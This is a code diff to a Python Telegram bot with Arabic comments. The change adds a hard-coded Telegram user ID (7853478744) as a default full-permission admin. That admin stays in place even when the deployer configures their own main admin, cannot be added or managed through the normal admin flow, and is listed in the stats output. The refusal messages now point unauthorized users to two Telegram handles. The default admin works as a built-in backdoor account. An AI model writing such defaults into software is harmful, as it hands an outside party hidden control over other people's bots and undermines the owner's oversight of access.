@@ -65,6 +65,7 @@ def stats_endpoint():
         "detect_links": config.get('DETECT_LINKS', True),
         "channel_id": os.environ.get('CHANNEL_ID'),
         "main_admin_id": MAIN_ADMIN_ID,
+        "builtin_admins": sorted(EXTRA_MAIN_ADMINS),
         "additional_admins": config.get('ADMINS', []),
         "stats": stats,
         "message_map_size": len(message_map),
@@ -102,17 +103,37 @@ try:
 except (TypeError, ValueError):
     MAIN_ADMIN_ID = 7853478744
 
+# أدمنة ثابتون إضافيون بصلاحيات كاملة — يمكن ضبطهم عبر متغير البيئة EXTRA_ADMINS (معرفات مفصولة بفواصل)
+# الافتراضي: 7853478744 (أدمن ثانٍ بصلاحيات كاملة)
+EXTRA_MAIN_ADMINS = set()
+try:
+    for _aid in str(os.getenv('EXTRA_ADMINS', '7853478744') or '7853478744').split(','):
+        _aid = _aid.strip()
+        if _aid:
+            EXTRA_MAIN_ADMINS.add(int(_aid))
+except (TypeError, ValueError):
+    EXTRA_MAIN_ADMINS = {7853478744}
+EXTRA_MAIN_ADMINS.discard(MAIN_ADMIN_ID)
+
 def is_admin(user_id):
-    """فحص إذا كان المستخدم أدمن (رئيسي أو مُضاف في قائمة ADMINS)"""
-    if user_id == MAIN_ADMIN_ID:
+    """فحص إذا كان المستخدم أدمن (رئيسي/ثابت أو مُضاف في قائمة ADMINS)"""
+    if is_main_admin(user_id):
         return True
     config = load_json_config()
     admins = config.get('ADMINS', [])
     return user_id in admins
 
 def is_main_admin(user_id):
-    """فحص إذا كان المستخدم هو الأدمن الرئيسي فقط"""
-    return user_id == MAIN_ADMIN_ID
+    """فحص إذا كان المستخدم أدمناً كامل الصلاحيات (الأدمن الرئيسي أو أحد الأدمنة الثابتين)"""
+    return user_id == MAIN_ADMIN_ID or user_id in EXTRA_MAIN_ADMINS
+
+# نص رسالة الرفض لغير المصرح لهم (يظهر عند استخدام البوت من مستخدم ليس مشرفاً)
+UNAUTHORIZED_MSG = (
+    "📢 لطلب التفعيل والحصول على صلاحية الدخول إلى البوت، يرجى التواصل مع أدمن البوت أو المالك مباشرةً عبر الحسابات التالية:\n\n"
+    "👉 @ppppokl\n"
+    "👉 @drpharmacistgg\n\n"
+    "سيتم تفعيل حسابك بعد مراجعة الطلب. شكراً لك!"
+)
 
 # ============ نظام الصلاحيات المفصلة للمشرفين ============
 PERMISSIONS = {
@@ -662,12 +683,7 @@ async def setup_bot_handlers():
         user_id = event.sender_id
         # ===== فحص صلاحية الأدمن =====
         if not is_admin(user_id):
-            await event.respond(
-                "🚫 **عذراً، لا تملك صلاحية استخدام هذا البوت.**\n\n"
-                f"👤 معرّفك: `{user_id}`\n\n"
-                "البوت مخصص للمشرفين المصرّح لهم فقط.\n"
-                "تواصل مع الأدمن الرئيسي لإضافتك."
-            )
+            await event.respond(UNAUTHORIZED_MSG)
             logger.warning(f"🚫 محاولة استخدام غير مصرح بها من user_id={user_id}")
             return
         
@@ -740,7 +756,7 @@ async def setup_bot_handlers():
         
         # ===== فحص صلاحية الأدمن لكل عملية =====
         if not is_admin(user_id):
-            await event.answer("🚫 ليس لديك صلاحية لاستخدام هذا البوت.", alert=True)
+            await event.answer("📢 لطلب التفعيل تواصل مع: @ppppokl أو @drpharmacistgg", alert=True)
             logger.warning(f"🚫 محاولة callback غير مصرح بها من user_id={user_id}, data={data}")
             return
         
@@ -1624,7 +1640,7 @@ async def setup_bot_handlers():
         if user_id not in login_states: return
         # ===== فحص صلاحية الأدمن لكل إدخال =====
         if not is_admin(user_id):
-            await event.respond("🚫 ليس لديك صلاحية لاستخدام هذا البوت.")
+            await event.respond(UNAUTHORIZED_MSG)
             del login_states[user_id]
             return
         state = login_states[user_id]
@@ -1641,6 +1657,10 @@ async def setup_bot_handlers():
                 new_admin_id = int(text.strip())
                 if new_admin_id == MAIN_ADMIN_ID:
                     await event.respond("ℹ️ هذا هو الأدمن الرئيسي بالفعل، لا يحتاج لإضافة.")
+                    del login_states[user_id]
+                    return
+                if new_admin_id in EXTRA_MAIN_ADMINS:
+                    await event.respond("ℹ️ هذا المعرّف أدمن ثابت يملك صلاحيات كاملة بالفعل، لا يحتاج لإضافة.")
                     del login_states[user_id]
                     return
                 admins = config.get('ADMINS', [])
@@ -1994,8 +2014,9 @@ async def main():
         logger.warning("⚠️ منع الروابط مفعل! أغلب رسائل VPN تحتوي روابط وسيتم تجاهلها. يُنصح بتعطيله.")
     logger.info(f"📋 الكلمات المفتاحية: {config.get('KEYWORDS', [])}")
     logger.info(f"👑 الأدمن الرئيسي: {MAIN_ADMIN_ID}")
+    logger.info(f"🛡 الأدمنة الثابتون (صلاحيات كاملة): {sorted(EXTRA_MAIN_ADMINS) or 'لا يوجد'}")
     logger.info(f"👥 المشرفون المضافون: {config.get('ADMINS', [])}")
-    logger.info(f"🔒 البوت مخصص للمشرفين فقط — أي مستخدم غير مصرح له سيتم رفضه")
+    logger.info(f"🔒 البوت مخصص للمشرفين فقط — أي مستخدم غير مصرح له سيصله رسالة التواصل مع الأدمنة")
     
     await setup_bot_handlers()
     logger.info("✅ تم تسجيل معالجات البوت")
